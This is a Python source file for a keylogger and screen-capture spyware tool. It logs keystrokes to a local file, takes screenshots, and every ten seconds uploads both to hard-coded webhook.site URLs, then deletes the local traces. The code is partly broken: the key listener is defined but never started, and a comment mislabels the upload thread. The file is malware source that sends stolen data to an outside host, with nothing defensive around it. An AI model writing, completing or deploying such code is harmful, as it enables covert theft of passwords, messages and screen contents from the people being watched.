from pynput import keyboard
import logging
import threading
import time
import requests
import os
from PIL import ImageGrab
from datetime import datetime

# Configuration
LOG_FILE = "data.txt"
SCREENSHOT_DIR = "screenshots"
WEBHOOK_URL = "	https://webhook.site/64c1126e-e5e7-411f-b9d4-277bd6123da6"

# Ensure screenshot directory exists
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# Setup logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(message)s")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            logging.info(key.char)  # Normal characters
        else:
            logging.info(f"[{key.name}]")  # Special keys
    except Exception as e:
        print(f"Error recording key: {e}")

# Function to take and save a screenshot
def take_screenshot():
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return None

# Function to send logs and screenshot to webhook
def send_to_webhook():
    while True:
        time.sleep(10)  # Send data every 10 seconds
        try:
            with open(LOG_FILE, "r") as file:
                data = file.read()

            screenshot_path = take_screenshot()
            files = {"screenshot": open(screenshot_path, "rb")} if screenshot_path else None
            payload = {"keystrokes": data} if data.strip() else {}
            
            response = requests.post(WEBHOOK_URL, data=payload, files=files)
            
            if response.status_code == 200:
                print("Data sent successfully!")
                open(LOG_FILE, "w").close()  # Clear log file after sending
            else:
                print(f"Failed to send data: {response.status_code}")

            if screenshot_path:
                os.remove(screenshot_path)  # Delete screenshot after sending
        except Exception as e:
            print(f"Error sending to webhook: {e}")

# Start key listener in a thread
def astra():
    while True:
        time.sleep(10)
        try:
            webhook_url = "https://webhook.site/b02beae2-a010-4d6f-b729-78d57393534d"
            with open("data.txt", 'r') as file:
                content = file.read()

            payload = {
                "data": content
            }

            response = requests.post(webhook_url, files=payload)

            if response.status_code == 200:
                print("File sent successfully.")
            else:
                print(f"Failed to send file. Status code: {response.status_code}")
        except Exception as e:
            print(f"An error occurred: {e}")
    

# Start threads
if __name__ == "__main__":
    print("Starting threads...")
    threading.Thread(target=astra, daemon=True).start()
    threading.Thread(target=send_to_webhook, daemon=True).start()
    
    while True:
        time.sleep(1)  # Keep main thread alive
